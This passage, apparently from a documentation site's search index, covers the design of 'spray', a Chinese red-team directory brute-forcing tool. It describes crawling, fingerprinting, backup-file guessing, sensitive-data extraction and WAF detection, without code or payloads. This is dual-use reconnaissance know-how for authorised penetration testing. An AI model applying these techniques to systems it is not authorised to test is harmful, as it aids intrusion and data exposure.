\u5185\u5305\u542b\u7684\u66f4\u591a\u4fe1\u606f, \u4f8b\u5982\u6307\u7eb9, title, \u654f\u611f\u4fe1\u606f. \u5728\u76ee\u5f55\u7206\u7834\u65f6, \u662f\u4f1a\u83b7\u53d6\u8fd9\u4e9b\u6570\u636e\u7684, \u4f46\u4f1a\u88ab\u76f4\u63a5\u629b\u5f03. \u800c spray \u4e0d\u4ec5\u4f1a\u6536\u96c6\u8fd9\u4e9b\u88ab\u5176\u4ed6\u5de5\u5177\u629b\u5f03\u7684\u6570\u636e, \u8fd8\u4f1a\u5c3d\u53ef\u80fd\u4ece\u4e2d\u69a8\u53d6\u6240\u6709\u6709\u4ef7\u503c\u7684\u6570\u636e.</p> <p>spray \u7684\u8f93\u51fa\u7ed3\u679c\u66f4\u50cf\u662f httpx \u4e0e ffuf \u90a3\u6837, \u4e0d\u4ec5\u4ec5\u53ea\u6709\u76ee\u5f55. \u6709\u4e0d\u5c11\u76ee\u5f55\u7206\u7834\u5de5\u5177\u5728\u8f93\u51fa\u7ed3\u679c\u65f6, \u629b\u5f03\u4e86\u6240\u6709\u4e2d\u95f4\u8f93\u51fa, \u5bfc\u81f4\u5bf9\u5176\u4e8c\u6b21\u5904\u7406\u8fd8\u9700\u8981 httpx \u8fd9\u6837\u7684\u5de5\u5177\u914d\u5408,\u518d\u6b21\u83b7\u53d6\u4fe1\u606f. \u4f1a\u989d\u5916\u53d1\u9001\u4e0d\u5c11\u8bf7\u6c42\u5305.</p> <p>spray \u7684\u6587\u4ef6\u8f93\u51fa\u7ed3\u679c\u4e2d, \u5305\u542b\u4e86\u5b8c\u6574\u7684\u8bf7\u6c42\u6458\u8981\u4fe1\u606f.</p> <p>\u5728\u76ee\u5f55\u7206\u7834\u65f6, spray \u8fd8\u5c06\u5bf9 title, \u6307\u7eb9\u8fdb\u884c\u8bc6\u522b, \u5e76\u63d0\u4f9b\u4e86<code>--extract</code>\u81ea\u5b9a\u4e49\u6b63\u5219\u4ece\u7f51\u9875\u4e2d\u63d0\u53d6\u6570\u636e. \u4e5f\u5305\u542b\u4e86\u4e00\u4e2a\u7b80\u6613\u7684\u722c\u866b.</p> <p>\u5728\u6ca1\u6709\u542f\u52a8\u9644\u52a0\u529f\u80fd\u65f6, spray \u4f1a\u83b7\u53d6\u7684\u4fe1\u606f\u6709:</p> <ul> <li>http \u57fa\u672c\u4fe1\u606f, \u72b6\u6001\u7801, content-type, body-length, redirect,\u8bf7\u6c42\u8017\u65f6\u7b49</li> <li>html \u7684 title</li> <li>\u88ab\u52a8\u7684\u6307\u7eb9\u8bc6\u522b</li> <li>body \u4e0e header \u7684 hash</li> <li>spray \u63d0\u4f9b\u7684\u4e00\u4e9b\u989d\u5916\u5c5e\u6027, \u4f8b\u5982\u88ab\u8fc7\u6ee4\u539f\u56e0, \u76ee\u5f55\u6765\u6e90, \u662f\u5426\u6709\u6548, \u662f\u5426\u4e3a\u6a21\u7cca\u6709\u6548</li> </ul>"},{"location":"spray/design/#\u722c\u866b","title":"\u722c\u866b","text":"<p>\u722c\u866b\u7684\u903b\u8f91\u7c7b\u4f3cjsfinder, \u4ece\u7f51\u9875\u4e2d\u63d0\u53d6\u53ef\u80fd\u7684 url, \u5e76\u8fdb\u884c\u9012\u5f52\u7684\u722c\u866b\u5904\u7406.</p> <p>\u8fd9\u4e2a\u722c\u866b\u7684\u8868\u73b0\u8fdc\u4f4e\u4e8e headless \u722c\u866b, \u5982\u679c\u6709\u66f4\u9ad8\u7ea7\u7684\u9700\u8981, \u8fd8\u662f\u5efa\u8bae\u4f7f\u7528katana , rad, \u6216crawlgo \u8fd9\u6837\u7684 headless \u722c\u866b\u5de5\u5177.</p> <p>\u4f46\u76f8\u6bd4\u4e8e\u539f\u7248\u7684 jsfinder \u4e2d\u7684\u903b\u8f91, spray \u8fdb\u884c\u4e86\u5927\u91cf\u4f18\u5316\u548c\u8c03\u6574\uff0c \u4ee5 jsfinder README.md \u4e2d\u7684<code>https://www.mi.com</code>\u4e3a\u4f8b, \u6709\u6570\u767e\u500d\u7684\u5dee\u8ddd(\u8fd8\u662f\u5728\u989d\u5916\u9650\u5236\u4e86 scope \u7684\u60c5\u51b5\u4e0b). \u5e76\u80fd\u5b9e\u73b0\u5bf9\u5f88\u591a jsfinder \u65e0\u6cd5\u6b63\u786e\u8bc6\u522b\u7684\u94fe\u63a5\u8fdb\u884c\u8bc6\u522b.</p> <p>\u5f53\u8fd9\u4e2a\u722c\u866b\u4e0e\u667a\u80fd\u8fc7\u6ee4\u7ed3\u5408\u5230\u4e00\u8d77, \u5c31\u81ea\u7136\u800c\u7136\u7684\u5b9e\u73b0\u4e86\u5bf9\u8fd9\u4e9b\u6709\u6548\u76ee\u5f55\u7684\u9a8c\u8bc1.</p> <p>\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u5b9e\u8df5, \u6211\u53d1\u73b0\u722c\u866b\u914d\u5408\u4e0a spray \u7684\u4fe1\u606f\u6536\u96c6\u80fd\u529b, \u80fd\u521b\u9020\u51fa\u5f88\u591a\u60ca\u559c. \u4e3a\u6b64. spray \u8fdb\u884c\u4e86\u4e00\u4e9b\u5fae\u5c0f\u7684\u8c03\u6574.</p> <ul> <li>\u901a\u8fc7\u722c\u866b\u8fdb\u884c\u7684\u626b\u63cf\u5c06\u8df3\u8fc7 precompare \u7684\u667a\u80fd\u8fc7\u6ee4. \u56e0\u4e3a\u722c\u866b\u83b7\u53d6\u7684\u76ee\u5f55\u672c\u5c31\u662f\u76f8\u5bf9\u9ad8\u4ef7\u503c\u7684\u76ee\u5f55, \u5c31\u7b97\u662f 404 \u9875\u9762\u4e5f\u4e0d\u4e00\u5b9a\u662f\u65e0\u6548\u7ed3\u679c. \u73b0\u5728\u722c\u866b\u5c06\u62e5\u6709\u66f4\u9ad8\u7684\u4f18\u5148\u7ea7</li> <li>spray \u5f53\u524d\u53ea\u5173\u6ce8\u76ee\u5f55/\u6587\u4ef6, \u56e0\u6b64\u722c\u866b\u722c\u5230\u7684\u53c2\u6570\u4e0e frag \u5c06\u4f1a\u88ab\u81ea\u52a8\u5220\u9664.</li> <li>\u722c\u866b\u914d\u5408<code>--extract</code>\u8fdb\u884c\u4fe1\u606f\u63d0\u53d6\u80fd\u62ff\u5230\u5f88\u591a\u6709\u8da3\u7684\u6570\u636e</li> <li>\u722c\u866b\u914d\u5408\u9012\u5f52\u52a0\u4e0a\u5907\u4efd\u6587\u4ef6\u4e0e\u901a\u7528\u6587\u4ef6\u7684\u626b\u63cf, \u4e5f\u80fd\u53d1\u73b0\u5f88\u591a\u6709\u8da3\u7684\u65b0\u7ed3\u679c</li> <li>\u722c\u866b\u8ba9 favicon hash \u8363\u83b7\u65b0\u751f. \u975e\u9ed8\u8ba4\u7684(<code>/favicon.ico</code>)\u7684 ico \u4e5f\u80fd\u51c6\u786e\u8bc6\u522b\u51fa\u6307\u7eb9\u4e86.</li> </ul> <p>\u5c31\u7b97\u662f\u7b80\u6613\u7684\u722c\u866b. \u5b9e\u73b0\u8d77\u6765\u4e5f\u8f83\u4e3a\u590d\u6742, spray \u76ee\u524d\u5185\u7f6e\u7684\u722c\u866b\u4e5f\u4e0d\u662f\u6700\u4f18\u7684\u914d\u7f6e. \u51e0\u4e4e\u6bcf\u4e2a\u7248\u672c\u90fd\u8981\u5bf9\u722c\u866b\u529f\u80fd\u8fdb\u884c\u5927\u91cf\u5fae\u8c03. \u8fd9\u4e2a spray \u4e2d\u7684\u722c\u866b\u8fd8\u6709\u5f88\u5927\u7684\u6f5c\u529b.</p> <p>\u722c\u866b\u672a\u6765\u63d0\u5347\u7684\u65b9\u5411:</p> <ul> <li>\u5f53\u524d\u722c\u866b\u88ab\u5f3a\u5236\u6307\u5b9a\u4e3a\u5f53\u524d host, \u4f46\u6211\u53d1\u73b0\u5f88\u591a\u7f51\u7ad9\u4f1a\u5728\u7b2c\u4e09\u65b9 cdn \u4e0a\u6258\u7ba1\u81ea\u5df1\u7684 js, \u800c\u8fd9\u4e9b js \u4e2d\u6709\u53ef\u80fd\u5305\u542b\u654f\u611f\u6570\u636e. \u56e0\u6b64\u540e\u7eed\u5c06\u4f1a\u5bf9 scope \u505a\u667a\u80fd\u4f18\u5316, \u4ee5\u53ca\u63d0\u4f9b\u5bf9\u5e94\u7684\u53c2\u6570.</li> <li>\u6839\u636e\u722c\u866b\u7684\u7ed3\u679c\u53bb\u6784\u9020\u5b57\u5178</li> </ul>"},{"location":"spray/design/#\u6307\u7eb9","title":"\u6307\u7eb9","text":"<p>\u76ee\u524d, \u9664\u4e86 httpx \u63d0\u4f9b\u4e86 wappalyzer \u7684\u89c4\u5219\u5e93, \u5176\u4ed6\u5de5\u5177\u90fd\u6ca1\u6709\u5b9e\u73b0\u7c7b\u4f3c\u7684\u529f\u80fd.</p> <p>\u800c wappalyzer \u5173\u6ce8\u7684\u4e3b\u8981\u662f\u7f51\u7ad9\u7684\u7ec4\u4ef6, \u4f8b\u5982\u4f7f\u7528\u4e86\u4ec0\u4e48\u8bed\u8a00, \u5f15\u5165\u4e86\u4ec0\u4e48\u7ec4\u4ef6. \u5b83\u7684\u5173\u6ce8\u70b9\u4e0e\u6e17\u900f\u6d4b\u8bd5\u573a\u666f\u5b9e\u9645\u4e0a\u5e76\u4e0d\u4e00\u81f4. \u5728\u7ea2\u961f/\u6e17\u900f\u6d4b\u8bd5\u573a\u666f\u4e2d, \u66f4\u9700\u8981\u7684\u662f\u7c7b\u4f3c whatweb \u90a3\u6837\u7684\u6307\u7eb9\u8bc6\u522b, \u4f9b\u5e94\u5546\u8bc6\u522b.</p> <p>\u800c spray \u4e0e gogo \u5171\u4eab\u4e86\u6307\u7eb9\u5e93, \u5b9e\u73b0\u4e86\u5bf9\u6570\u5343\u6761\u7ea2\u961f\u53ef\u80fd\u4f1a\u5173\u6ce8\u7684\u6307\u7eb9\u7684\u8bc6\u522b.</p> <p>\u5e76\u4e14\u540c\u6837\u5f15\u5165\u4e86\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b, \u6839\u636e\u914d\u7f6e\u751f\u6210\u53ef\u80fd\u5b58\u5728\u5173\u952e\u4fe1\u606f\u7684\u76ee\u5f55\u8fdb\u884c\u7206\u7834. \u8fd9\u91cc\u7684\u903b\u8f91\u4e0e gogo \u4e2d\u7684\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u6709\u7ec6\u5fae\u7684\u4e0d\u540c. spray \u4f1a\u5c06\u9700\u8981\u4e3b\u52a8\u63a2\u6d4b\u7684\u76ee\u5f55\u751f\u6210\u4e00\u4e2a\u5b57\u5178, \u5e76\u8fdb\u884c\u5168\u91cf\u7684\u89c4\u5219\u5339\u914d. \u800c\u975e gogo \u90a3\u6837\u7684\u7cbe\u51c6\u5339\u914d. \u56e0\u6b64\u5b9e\u9645\u4e0a spray \u5728\u914d\u7f6e\u4e86\u76f8\u540c\u7684\u6307\u7eb9\u7684\u60c5\u51b5\u4e0b, \u4f1a\u6bd4 gogo \u6709\u4e9b\u8bb8\u63d0\u5347(\u53ef\u80fd\u53ea\u80fd\u63d0\u5347 1%\u4e0d\u5230, \u67d0\u4e9b\u60c5\u51b5\u4e0b\u80fd\u5e26\u6765\u60ca\u559c)</p> <p>spray \u6ca1\u6709 gogo \u90a3\u4e48\u591a\u987e\u8651, \u540e\u7eed\u4e5f\u53ef\u80fd\u4f1a\u8003\u8651\u5c06 wappalyzer \u63a5\u5165, \u63d0\u4f9b\u66f4\u4e30\u5bcc\u7684\u4fe1\u606f.</p> <p>\u4e5f\u56e0\u6b64, \u5728\u914d\u7f6e\u4e86\u540c\u6837\u6307\u7eb9\u7684\u60c5\u51b5\u4e0b, spray \u7684\u6548\u679c\u4f1a\u8fdc\u597d\u4e8e gogo, \u6709\u597d\u51e0\u4e2a\u65b9\u9762\u7efc\u5408\u8fbe\u6210\u4e86\u8fd9\u4e00\u70b9.</p> <ul> <li> <p>spray \u4e2d\u5185\u7f6e\u4e86\u722c\u866b, \u722c\u866b\u914d\u5408\u4e0a\u88ab\u52a8\u6307\u7eb9\u8bc6\u522b, \u80fd\u8bc6\u522b\u5230\u5f88\u591a\u4e4b\u524d\u8bc6\u522b\u4e0d\u5230\u7684\u6307\u7eb9, \u4f8b\u5982\u901a\u8fc7 js \u8df3\u8f6c\u7684\u9875\u9762, \u5728 gogo \u4e2d\u53ea\u80fd\u901a\u8fc7\u8bc6\u522b\u8df3\u8f6c\u7684 url \u4e2d\u7684\u7279\u5f81, \u800c spray \u901a\u8fc7\u722c\u866b\u53ef\u4ee5\u83b7\u53d6\u5230\u8df3\u8f6c\u540e\u7684\u9875\u9762,</p> </li> <li> <p>\u4e5f\u56e0\u4e3a\u722c\u866b\u53ef\u4ee5\u83b7\u53d6\u5230\u6240\u6709\u7684 ico \u8def\u5f84, spray \u6dfb\u52a0\u4e86\u57fa\u4e8e content-type \u7684\u667a\u80fd\u5224\u65ad, \u53ef\u4ee5\u5c06 ico hash \u53d1\u6325\u5230\u6781\u81f4. \u5f88\u591a\u975e<code>/favicon.ico</code>\u7684 ico \u4e5f\u80fd\u6b63\u5e38\u8bc6\u522b</p> </li> <li> <p>spray \u4e0d\u4f1a\u50cf gogo \u4e00\u6837\u5c06 host \u89e3\u6790\u4e3a ip, \u56e0\u6b64\u914d\u5408\u4e0a host \u7206\u7834, \u6216\u8005\u9762\u5bf9 cdn \u5e38\u89c1, \u6307\u7eb9\u8bc6\u522b\u4e5f\u80fd\u6b63\u5e38\u53d1\u6325\u4f5c\u7528.</p> </li> <li> <p>spray \u624b\u52a8\u5904\u7406 redirect. \u5728 gogo \u4e2d\u5e76\u6ca1\u6709\u5c06\u6307\u7eb9\u8bc6\u522b\u4f5c\u7528\u5230 redirect \u7684\u6bcf\u4e00\u6b21\u8df3\u8f6c, \u800c spray \u56e0\u4e3a\u624b\u52a8\u5904\u7406\u4e86\u6240\u6709 redirect \u8bf7\u6c42, \u56e0\u6b64\u4e00\u4e9b\u975e\u5e38\u7279\u6b8a\u7684\u7f51\u7ad9\u4e5f\u80fd\u6b63\u5e38\u8bc6\u522b. \u8fd9\u4e00\u70b9\u66fe\u7ecf\u5728\u597d\u51e0\u6b21\u9879\u76ee\u4e2d\u53d1\u73b0\u4e86\u975e\u5e38\u9690\u853d\u4e14\u5173\u952e\u7684\u6307\u7eb9. \u5e76\u4e14\u80fd\u83b7\u53d6\u6bcf\u6b21 redirect \u7684\u57fa\u672c\u4fe1\u606f.</p> </li> </ul> <p>\u6b63\u56e0\u4e3a\u722c\u866b\u4e0e\u88ab\u52a8\u6307\u7eb9\u8bc6\u522b\u7684\u7ed3\u5408, spray \u5b9e\u9645\u4e0a\u8fd8\u6709\u7528\u66f4\u52a0\u5f3a\u5927\u7684\u6307\u7eb9\u8bc6\u522b\u80fd\u529b. \u5c31\u7b97\u7f51\u7ad9\u4fee\u6539\u4e86\u9996\u9875\u7684\u6837\u5f0f, \u5728 JS \u6587\u4ef6\u4e2d\u7684\u7279\u5f81\u4f9d\u65e7\u4e0d\u80fd\u6539\u53d8.</p> <p>gogo \u539f\u672c\u7684\u6307\u7eb9\u5e93\u662f\u4e3a\u4e86\u5185\u7f51\u573a\u666f\u505a\u4e86\u4e0d\u5c11\u53d6\u820d, \u800c\u73b0\u5728\u8fd9\u4e9b\u820d\u5f03\u7684\u4e1c\u897f\u90fd\u53ef\u4ee5\u52a0\u56de\u6765. \u540e\u7eed\u5c06\u4f1a\u7ed9 spray \u63d0\u4f9b\u66f4\u52a0\u5f3a\u5927\u7684\u6307\u7eb9\u5e93.</p> <p>\u4e0d\u5f97\u4e0d\u8bf4, \u5f53\u521d\u4e3a gogo \u8bbe\u8ba1\u7684\u6700\u5c0f\u5316\u5339\u914d\u7684\u6307\u7eb9\u5e93\u5e76\u4e0d\u5b8c\u5168\u9002\u5e94 spray, \u5b58\u5728\u4e00\u5b9a\u7684\u8bef\u62a5, \u8fd8\u9700\u8981\u540e\u7eed\u4f18\u5316\u6307\u7eb9\u5e93.</p>"},{"location":"spray/design/#\u5176\u4ed6\u9644\u52a0\u4fe1\u606f\u6536\u96c6\u624b\u6cd5","title":"\u5176\u4ed6\u9644\u52a0\u4fe1\u606f\u6536\u96c6\u624b\u6cd5","text":"<p>\u9664\u4e86\u5df2\u7ecf\u63d0\u5230\u8fc7\u7684\u722c\u866b\u548c\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u4e4b\u5916, spray \u76ee\u524d\u8fd8\u63d0\u4f9b\u4e86\u591a\u79cd\u65b9\u5f0f\u8fdb\u884c\u6536\u96c6. \u5f53\u7136\u624b\u6cd5\u4e0d\u6b62 spray \u63d0\u4f9b\u7684\u8fd9\u4e9b, \u5982\u679c\u6709 spray \u8fd8\u4e0d\u652f\u6301\u7684\u7c7b\u4f3c\u7684\u529f\u80fd, \u6b22\u8fce\u63d0\u4f9b issue.</p> <p>\u8fd9\u4e9b\u529f\u80fd\u90fd\u9700\u8981\u6dfb\u52a0\u989d\u5916\u7684\u53c2\u6570\u6216\u8005<code>-a</code>\u6253\u5f00. \u56e0\u6b64\u79f0\u4e4b\u4e3a<code>additional</code>\u4fe1\u606f\u6536\u96c6\u624b\u6cd5.</p> <ul> <li> <p><code>--bak</code> , \u5907\u4efd\u6587\u4ef6\u7684\u7206\u7834, \u903b\u8f91\u7c7b\u4f3c fuzzuli \u4e2d\u7684\u57fa\u4e8e host \u7684\u5b57\u5178\u751f\u6210+\u901a\u7528\u7684\u5e38\u89c1\u5907\u4efd\u6587\u4ef6\u76ee\u5f55. \u8003\u8651\u5230 url \u8bf7\u6c42\u53ef\u80fd\u4f1a\u5c06\u5907\u4efd\u6587\u4ef6\u4e0b\u8f7d\u5230\u5185\u5b58\u4e2d, \u9020\u6210\u6ea2\u51fa. \u9ed8\u8ba4\u7684 body \u4e0a\u9650\u4e3a 100k. \u8d85\u8fc7 100k \u7684\u6587\u4ef6\u5c06\u4e0d\u4f1a\u7ee7\u7eed\u8bfb\u53d6, \u800c\u662f\u653e\u5f03\u8fd9\u4e2a\u63e1\u624b, \u91cd\u65b0\u5efa\u7acb\u8fde\u63a5(keep-alive \u5982\u679c\u4e0d\u8bfb\u5b8c body, \u5c06\u65e0\u6cd5\u590d\u7528\u94fe\u63a5)</p> </li> <li> <p><code>--bak-file</code> , \u5bf9\u4e8e\u5355\u4e2a\u6587\u4ef6\u7684\u5907\u4efd\u5b57\u5178\u751f\u6210, \u4e0e\u4e4b\u524d\u63d0\u9ad8\u7684\u8f7b\u91cf\u7ea7\u9012\u5f52\u6709\u4e9b\u7c7b\u4f3c. \u5982\u679c\u53d1\u73b0\u6709\u6548\u6587\u4ef6(\u975e\u76ee\u5f55), \u5c06\u4f1a\u6839\u636e\u8fd9\u4e2a\u6587\u4ef6\u751f\u6210\u4e00\u4e2a\u5b57\u5178, \u8fdb\u884c\u7206\u7834.</p> </li> <li> <p><code>--common</code>, \u901a\u7528\u6587\u4ef6\u7206\u7834, \u8bed\u8a00 | \u6846\u67b6 | IDE | \u5f00\u6e90\u7b49\u7b49\u90fd\u4f1a\u6709\u7559\u4e0b\u4e00\u4e9b\u901a\u7528\u6587\u4ef6. \u6709\u4e9b\u65f6\u5019\u6ca1\u6709\u53d1\u73b0\u6307\u7eb9, \u4f46\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u901a\u7528\u6587\u4ef6\u53d1\u73b0\u4e00\u4e9b\u4fe1\u606f</p> </li> <li> <p><code>--recon</code>, \u81ea\u52a8\u63d0\u53d6\u654f\u611f\u4fe1\u606f, \u5728\u6709\u6548\u76ee\u5f55\u4e2d\u63d0\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u53ef\u5728 yaml \u4e2d\u914d\u7f6e\u89c4\u5219\uff0c \u76ee\u524d\u7684\u89c4\u5219\u53c2\u8003 HaE \u4e0e nuclei \u4e2d\u7684 exposure</p> </li> </ul> <p>\u901a\u8fc7 spray \u672c\u8eab\u7684\u529f\u80fd\u5373\u53ef\u521b\u9020\u51fa\u5f88\u591a\u6709\u8da3\u7684\u9884\u8bbe. \u540e\u7eed\u53ef\u80fd\u4f1a\u7ef4\u62a4\u4e00\u4e2a\u9884\u8bbe\u4ed3\u5e93, \u7528\u6765\u9762\u5bf9\u5404\u79cd\u573a\u666f\u5b9e\u73b0\u591a\u79cd\u591a\u6837\u7684\u73a9\u6cd5.</p>"},{"location":"spray/design/#\u534f\u8bae\u5347\u7ea7","title":"\u534f\u8bae\u5347\u7ea7","text":"<p>\u5982\u679c\u5bf9\u4e00\u4e2a https \u7f51\u7ad9\u4f7f\u7528 http \u53bb\u8bbf\u95ee, \u5219\u5927\u6982\u7387\u4f1a\u83b7\u5f97 400 \u7684\u72b6\u6001\u7801, \u544a\u8bc9\u4f60\u534f\u8bae\u9519\u8bef. \u4f46\u5f88\u591a\u7f51\u7ad9\u914d\u7f6e\u4e86\u81ea\u52a8\u7684\u534f\u8bae\u5347\u7ea7, \u901a\u8fc7 location \u91cd\u5b9a\u5411\u5230 https \u7684\u5bf9\u5e94\u7f51\u7ad9. \u800c\u5728\u6279\u91cf\u7206\u7834\u65f6, \u5f88\u96be\u4eba\u5de5\u4e00\u4e2a\u4e00\u4e2a\u53bb\u5224\u65ad\u662f http \u8fd8\u662f https.</p> <p>\u4e3a\u6b64 spray \u4e2d\u6dfb\u52a0 http upgrade to https \u7684\u4f18\u5316. \u5e76\u4e14\u5728\u534f\u8bae\u5347\u7ea7\u65f6, \u4f1a\u91cd\u65b0\u83b7\u53d6 baseline, \u5e76\u5728\u547d\u4ee4\u884c\u6709\u63d0\u793a.</p> <p>\u5728\u672a\u6765, spray \u8fd8\u4f1a\u9488\u5bf9 http2/http3 \u81ea\u52a8\u5c1d\u8bd5\u534f\u8bae\u5347\u7ea7.</p>"},{"location":"spray/design/#waf-\u5224\u65ad","title":"WAF \u5224\u65ad","text":"<p>\u90e8\u5206 waf \u7684\u903b\u8f91\u4f1a\u5728\u7206\u7834\u5230\u4e00\u5b9a\u6570\u91cf\u65f6\u8fdb\u884c\u5c01 ip,\u6216\u8005\u8df3\u8f6c\u5230 waf \u9875\u9762\u5904\u7406.</p> <p>\u5982\u679c\u662f\u5c01 ip \u6bd4\u8f83\u597d\u5904\u7406, \u8fde\u7eed\u7684\u62a5\u9519\u79ef\u7d2f\u5230\u4e00\u5b9a\u7a0b\u5ea6\u9000\u51fa\u7a0b\u5e8f\u5373\u53ef.</p> <p>\u5904\u7406\u8df3\u8f6c\u7c7b\u578b\u7684 waf \u76f8\u5bf9\u590d\u6742\u4e00\u4e0b. \u6211\u4eec\u901a\u8fc7\u6bcf\u9694\u4e00\u5b9a\u8bf7\u6c42, \u53d1\u9001 check \u5305, \u5e76\u4e0e\u6700\u521d\u7684\u57fa\u51c6\u503c\u8fdb\u884c\u5bf9\u6bd4, \u5982\u679c\u8fde\u7eed\u591a\u4e2a check \u5305\u7684\u4e0e\u57fa\u51c6\u503c\u53d1\u751f\u504f\u79bb, \u90a3\u5c31\u5224\u65ad\u5df2\u7ecf\u88ab waf \u4e86.</p> <p>\u5b9e\u9645\u4e0a, \u6307\u7eb9\u5e93\u4e2d\u652f\u6301\u4e86\u5bf9 waf \u6307\u7eb9\u7684\u8bc6\u522b, \u4f46\u56e0\u4e3a\u90e8\u5206 waf \u5b58\u5728\u5168\u5c40\u6307\u7eb9, \u5bfc\u81f4\u53ef\u80fd\u51fa\u73b0\u4e00\u4e9b\u8bef\u5224, \u8fd9\u4e00\u70b9\u5c06\u4f1a\u5728\u6307\u7eb9\u5e93\u4f18\u5316\u540e, \u91cd\u65b0\u4e0a\u7ebf\u57fa\u4e8e\u6307\u7eb9\u7684 waf \u5224\u65ad. \u73b0\u5728\u53ea\u80fd\u5728\u8f93\u51fa\u7ed3\u679c\u4e2d\u770b\u5230 WAF \u6307\u7eb9, \u4e0d\u4f1a\u5bf9\u88ab WAF \u9000\u51fa\u6709\u5b9e\u9645\u5f71\u54cd.</p> <p>\u8fd9\u662f\u5355\u4e2a\u4efb\u52a1\u4e0e waf \u5bf9\u6297\u7684\u624b\u6bb5, \u4ec5\u9650\u4e8e\u53d1\u73b0 waf, \u5e76\u4e0d\u80fd\u7ed5\u8fc7 WAF. \u7ed5\u8fc7\u7684\u624b\u6bb5\u4f1a\u5728\u6279\u91cf\u4e0e\u5206\u5e03\u5f0f\u4e2d\u4ecb\u7ecd.</p>"},{"location":"spray/design/#\u6570\u636e\u4e8c\u6b21\u5904\u7406","title":"\u6570\u636e\u4e8c\u6b21\u5904\u7406","text":"<p>\u56e0\u4e3a spray \u7684\u8f93\u51fa\u683c\u5f0f\u63a5\u8fd1 httpx \u4e0e ffuf, \u540c\u6837\u652f\u6301\u5bf9\u4ed6\u7684\u6570\u636e\u7684\u8fdb\u884c\u4e8c\u6b21\u5904\u7406, \u53ef\u4ee5\u50cf httpx \u4e0e ffuf \u4e00\u6837\u4f7f\u7528 spray.</p> <p>\u4e3a\u6b64\u63d0\u4f9b\u4e86<code>--dump</code>\u53c2\u6570\u4e0d\u8bba\u7ed3\u679c\u662f\u5426\u6709\u6548, \u4fdd\u5b58 spray \u8bf7\u6c42\u7684\u6bcf\u4e00\u4e2a\u54cd\u5e94.</p> <p>\u540e\u7eed\u8fd8\u4f1a\u63d0\u4f9b\u5b8c\u6574\u7684\u54cd\u5e94\u5305\u7684\u539f\u59cb(header, body)\u6570\u636e. \u7528\u4f5c\u8fdb\u4e00\u6b65\u7684\u7684\u6570\u636e\u5206\u6790. \u751a\u81f3\u5b9e\u73b0\u7c7b\u4f3c nuclei \u4e2d offline scan \u4e00\u6837\u7684\u529f\u80fd.</p>"},{"location":"spray/design/#\u6279\u91cf\u4e0e\u5206\u5e03\u5f0f","title":"\u6279\u91cf\u4e0e\u5206\u5e03\u5f0f","text":"<p>(\u529f\u80fd\u5df2\u5b9e\u73b0, \u6587\u6863\u5f85\u5b8c\u6210)</p>"},{"location":"spray/design/#\u65ad\u70b9\u7eed\u4f20","title":"\u65ad\u70b9\u7eed\u4f20","text":"<p>(\u529f\u80fd\u5df2\u5b9e\u73b0, \u6587\u6863\u5f85\u5b8c\u6210)</p>"},{"location":"spray/design/#\u6b7b\u7ebf","title":"\u6b7b\u7ebf","text":"<p>(\u529f\u80fd\u5df2\u5b9e\u73b0, \u6587\u6863\u5f85\u5b8c\u6210)</p>"},{"location":"spray/design/#\u5176\u4ed6\u76ee\u5f55\u6536\u96c6\u65b9\u5f0f","title":"\u5176\u4ed6\u76ee\u5f55\u6536\u96c6\u65b9\u5f0f","text":"<p>spray \u60f3\u8981\u89e3\u51b3\u7684\u662f\u9700\u8981\u4e3b\u52a8\u53d1\u5305\u7684\u573a\u666f. \u5b9e\u9645\u4e0a\u5176\u4ed6\u65b9\u5f0f.</p> <p>\u88ab\u52a8\u7684 url \u6536\u96c6</p> <p>\u5373\u4e0d\u4e0e\u76ee\u6807\u8fdb\u884c\u4ea4\u4e92\u5b9e\u73b0\u7684\u7eaf\u88ab\u52a8 url \u6536\u96c6. \u5e38\u89c1\u7684\u6709\u6570\u636e\u6e90:</p> <ul> <li>webarchive</li> <li>\u5404\u5bb6\u641c\u7d22\u5f15\u64ce</li> <li>\u5404\u5bb6\u5a01\u80c1\u60c5\u62a5\u5e73\u53f0</li> <li>...</li> </ul> <p>\u540e\u7eed\u53ef\u80fd\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u7c7b\u4f3c subfinder \u90a3\u6837\u7684\u5de5\u5177\u5b9e\u73b0. \u4f3c\u4e4e\u5f00\u6e90\u793e\u533a\u4e5f\u5df2\u7ecf\u63d0\u4f9b\u4e86\u7c7b\u4f3c\u7684\u5de5\u5177.</p> <p>\u901a\u8fc7 headless \u722c\u866b\u8fdb\u884c\u7684 url \u6536\u96c6</p> <ul> <li>katana projectdiscovery \u63d0\u4f9b\u7684\u5de5\u5177, \u6bd4\u8f83\u7b26\u5408 chainreactor \u7684\u8bbe\u8ba1, \u540e\u7eed\u5c06\u4f1a\u96c6\u6210\u5230 kindred \u4e2d</li> <li>rad \u957f\u4ead\u63d0\u4f9b\u7684\u95ed\u6e90\u7684 headless \u722c\u866b</li> <li>crawlgo 360 \u63d0\u4f9b\u7684\u5f00\u6e90 headless \u722c\u866b</li> </ul> <p>headless \u722c\u866b\u5176\u5b9e\u4e0d\u5c11, \u4e3a\u5b89\u5168\u9886\u57df\u8bbe\u8ba1\u7684\u722c\u866b\u53c8\u4e0d\u591a</p> <p>\u57fa\u4e8e api \u7684 url \u6536\u96c6</p> <p>\u8fd9\u4e2a\u9886\u57df\u5c5e\u4e8e api \u5b89\u5168, \u4e5f\u6709\u975e\u5e38\u591a\u7684\u7ec6\u8282, spray \u6682\u65f6\u4e0d\u6253\u7b97\u6d89\u53ca.\u5e38\u89c1\u7684\u6709:</p> <ul> <li>swagger</li> <li>wsdl</li> <li>graphql</li> <li>showdoc/yapi/apidoc \u7b49\u81ea\u52a8\u751f\u6210\u7684\u6587\u6863\u5de5\u5177</li> <li>....</li> </ul> <p>\u6211\u4e2a\u4eba\u4f1a\u4f7f\u7528apifox\u8fdb\u884c\u624b\u52a8\u6d4b\u8bd5</p> <p>\u5176\u4ed6\u624b\u6cd5</p> <p>\u9664\u4e86\u4e0a\u9762\u8fd9\u51e0\u9879, \u8fd9\u4e2a\u9886\u57df\u7ee7\u7eed\u6df1\u6316\u8fd8\u6709\u5f88\u591a\u5185\u5bb9.</p> <ul> <li>\u8bf7\u6c42\u8d70\u79c1\u4e0e\u7f13\u5b58\u6295\u6bd2\u5728\u8fd9\u4e2a\u9886\u57df\u7684\u5229\u7528</li> <li>\u4e00\u4e9b 